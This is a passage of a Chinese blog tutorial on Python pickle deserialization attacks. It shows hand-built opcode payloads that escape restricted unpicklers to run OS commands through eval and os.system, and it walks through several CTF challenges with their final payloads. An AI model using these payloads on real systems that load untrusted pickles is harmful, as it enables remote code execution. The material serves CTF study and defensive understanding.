<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cposix</span><br><span class="line">system</span><br><span class="line">(Vtouch /tmp/success</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<p>这一段代码仍然是可以执行命令的。当然，有了memo可以让编写程序变得更加方便，使用 <code>g</code> 即可将memo中的内容取回栈顶。</p>
<p>那么，我们来尝试编写绕过沙盒的pickle代码吧。</p>
<p>首先使用 <code>c</code> ，获取 <code>getattr</code> 这个可执行对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br></pre></td></tr></table></figure>
<p>然后我们需要获取当前上下文，Python中使用 <code>globals()</code> 获取上下文，所以我们要获取 <code>builtins.globals</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">globals</span><br></pre></td></tr></table></figure>
<p>Python中globals是个字典，我们需要取字典中的某个值，所以还要获取 <code>dict</code> 这个对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">dict</span><br></pre></td></tr></table></figure>
<p>上述这几个步骤都比较简单，我们现在加强一点难度。现在执行 <code>globals()</code> 函数，获取完整上下文：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">globals</span><br><span class="line">(tR</span><br></pre></td></tr></table></figure>
<p>其实也很简单，栈顶元素是builtins.globals，我们只需要再压入一个空元组 <code>(t</code> ，然后使用 <code>R</code> 执行即可。</p>
<p>然后我们用 <code>dict.get</code> 来从globals的结果中拿到上下文里的 <code>builtins对象</code> ，并将这个对象放置在memo[1]：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">dict</span><br><span class="line">S&#x27;get&#x27;</span><br><span class="line">tR(cbuiltins</span><br><span class="line">globals</span><br><span class="line">(tRS&#x27;builtins&#x27;</span><br><span class="line">tRp1</span><br></pre></td></tr></table></figure>
<p>到这里，我们已经获得了阶段性的胜利， <code>builtins</code> 对象已经被拿到了：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/5e328354e7133a217862a3408f2d3e01" alt="Code-Breaking中的两个Python沙箱"></p>
<p>接下来，我们只需要再从这个没有限制的 <code>builtins</code> 对象中拿到eval等真正危险的函数即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(g1</span><br><span class="line">S&#x27;eval&#x27;</span><br><span class="line">tR</span><br></pre></td></tr></table></figure>
<p>g1就是刚才获取到的 <code>builtins</code> ，我继续使用getattr，获取到了 <code>builtins.eval</code> 。</p>
<p>再执行这个eval：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">dict</span><br><span class="line">S&#x27;get&#x27;</span><br><span class="line">tR(cbuiltins</span><br><span class="line">globals</span><br><span class="line">(tRS&#x27;builtins&#x27;</span><br><span class="line">tRp1</span><br><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(g1</span><br><span class="line">S&#x27;eval&#x27;</span><br><span class="line">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/e3d5f75790d4e4b280c9e6be16530be7" alt="Code-Breaking中的两个Python沙箱"></p>
<p>成功绕过沙盒。</p>
<hr>
<h1>CTF题目</h1>
<h2 id="高校战-疫">高校战&quot;疫&quot;</h2>
<p>分析<br>
考点是pickle反序列化，过滤掉了  R 指令码，并且重写了 find_class：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">       <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">           <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">       <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br></pre></td></tr></table></figure>
<p>这就禁止引用除了 <code>__main__</code> 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改<br>
于是可以先引入<code>__main__.secret</code>这个module，然后把一个 dict 压入栈，内容是<code> &#123;'name': 'xx', 'category': 'yyy'&#125;</code>,之后执行 build指令，改写 <code>__main__.secret.name </code>和<code> __main__.secret.category</code>,此时 secret.name和 secret.category 已经变成我们想要的内容<br>
之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下<br>
<code>b&quot;\x80\x03c__main__\nsecret\n&#125;(Vname\nVxx\nVcategory\nVyyy\nub0c__main__\nAnimal\n)\x81&#125;(S'name'\nS'xx'\nS'category'\nS'yyy'\nub.&quot;</code></p>
<p>编码为base64提交即可<br>
<code>gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg==</code></p>
<h2 id="SUCTF-2019-Guess-game">SUCTF 2019 Guess_game</h2>
<blockquote>
<p>完整源码：<a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p>
</blockquote>
<p>猜数游戏，10 以内的数字，猜对十次就返回 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Ticket.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, number</span>):</span><br><span class="line">        <span class="variable language_">self</span>.number = number</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(<span class="variable language_">self</span>) == <span class="built_in">type</span>(other) <span class="keyword">and</span> <span class="variable language_">self</span>.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">type</span>(<span class="variable language_">self</span>.number) == <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= <span class="variable language_">self</span>.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="comment"># file: game_client.py</span></span><br><span class="line">number = <span class="built_in">input</span>(<span class="string">&#x27;Input the number you guess\n&gt; &#x27;</span>)</span><br><span class="line">ticket = Ticket(number)</span><br><span class="line">ticket = pickle.dumps(ticket)</span><br><span class="line">writer.write(pack_length(<span class="built_in">len</span>(ticket)))</span><br><span class="line">writer.write(ticket)</span><br></pre></td></tr></table></figure>
<p>client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: game_server.py 有删减</span></span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">    ticket = stdin_read(length)</span><br><span class="line">    ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(ticket) == Ticket</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;The number is invalid.&#x27;</span>)</span><br><span class="line">        game.next_game(Ticket(-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    win = game.next_game(ticket)</span><br><span class="line">    <span class="keyword">if</span> win:</span><br><span class="line">        text = <span class="string">&quot;Congratulations, you get the right number!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;Wrong number, better luck next time.&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">&quot;Game over! You win all the rounds, here is your flag %s&quot;</span> % flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;Game over! You got %d/%d.&quot;</span> % (game.win_count, game.round_count)</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file: RestrictedUnpickler.py  对引入的模块进行检测</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;guess_game&quot;</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
<p>server 端将接收到的数据进行反序列，这里与常规的 pickle.loads 不同，采用的是 Python 提供的<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals">安全措施</a>。也就是说，导入的模块只能以 guess_name 开头，并且名称里不能含有 __。</p>
<p>最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Game.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Game</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        <span class="variable language_">self</span>.curr_ticket = Ticket(number)</span><br><span class="line">        <span class="variable language_">self</span>.round_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_game</span>(<span class="params">self, ticket</span>):</span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.curr_ticket == ticket:</span><br><span class="line">            <span class="variable language_">self</span>.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        <span class="variable language_">self</span>.curr_ticket = Ticket(number)</span><br><span class="line">        <span class="variable language_">self</span>.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">finished</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_win</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.win_count == max_round</span><br></pre></td></tr></table></figure>
<p>只要能控制住 curr_ticket，每局就能稳赢，或者直接将 win_count 设为 10，能实现吗？</p>
<p>先试试覆盖 win_count 和 round_count。换句话来说，就是需要在反序列化 Ticket 对象前执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from guess_game import game  # __init__.py  game = Game()</span><br><span class="line">game.round_count = 10</span><br><span class="line">game.win_count = 10</span><br></pre></td></tr></table></figure>
<p>pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BUILD = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()</span><br><span class="line"># 具体实现在 pickle.py 的 1546 行</span><br></pre></td></tr></table></figure>
<p>开始构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S&#x27;round_count&#x27;</span><br><span class="line">I10</span><br><span class="line">sS&#x27;win_count&#x27;</span><br><span class="line">I10</span><br><span class="line">sb</span><br></pre></td></tr></table></figure>
<p>其中，} 是往 stack 中压入一个空 dict，s 是将键值对插入到 dict。</p>
<p>测试一下效果，成功。</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t0168786187ad5d1b6d.jpg"><img src="https://p2.ssl.qhimg.com/t0168786187ad5d1b6d.jpg" alt="img"></a></p>
<p>到这就做完了吗？不，还有个小验证，assert type(ticket) == Ticket。</p>
<p>之前提到过，pickle 序列流执行完后将把栈顶的值返回，那结尾再留一个 Ticket 的对象就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ticket = Ticket(6)</span><br><span class="line">res = pickle.dumps(ticket)  # 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor</span><br><span class="line">print(res)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>最终 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game\ngame\n&#125;S&quot;win_count&quot;\nI10\nsS&quot;round_count&quot;\nI9\nsbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span><br></pre></td></tr></table></figure>
<p>尝试覆盖掉 current_ticket：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cguess_game\n</span><br><span class="line">game</span><br><span class="line">&#125;S&#x27;curr_ticket&#x27;</span><br><span class="line">cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sbp0</span><br><span class="line">sbg0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
<p>这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。</p>
<p>最终 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game\ngame\n&#125;S&#x27;curr_ticket&#x27;\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x07sbp0\nsbg0\n.</span><br></pre></td></tr></table></figure>
<h2 id="Code-Breaking-2018-picklecode">Code-Breaking 2018 picklecode</h2>
<blockquote>
<p>完整源码： <a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">&#x27;PickleSerializer&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">globals</span>()[<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;=&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">dict</span>.get(<span class="built_in">globals</span>(), <span class="string">&#x27;__builtins__&#x27;</span>), <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure>
<p>getattr 和 globals 并没有被禁，那就尝试写 pickle 吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(cbuiltins</span><br><span class="line"><span class="built_in">dict</span></span><br><span class="line">S<span class="string">&#x27;get&#x27;</span></span><br><span class="line">tRp100</span><br><span class="line">(cbuiltins</span><br><span class="line"><span class="built_in">globals</span></span><br><span class="line">(tRS<span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">tRp101</span><br><span class="line">0g100</span><br><span class="line">(g101</span><br><span class="line">S<span class="string">&#x27;eval&#x27;</span></span><br><span class="line">tR(S<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<p>PS：我的环境是 Python 3.7.4，反序列化时获取到的 builtins 是一个 dict，所以用了两次 get，视环境进行调整吧。这个 payload 在 Python 3.7.3 又跑不起来 ：）</p>
<h2 id="BalsnCTF-2019-Pyshv1">BalsnCTF 2019 Pyshv1</h2>
<blockquote>
<p>环境： <a target="_blank" rel="noopener" href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(<span class="variable language_">self</span>, module, name)</span><br><span 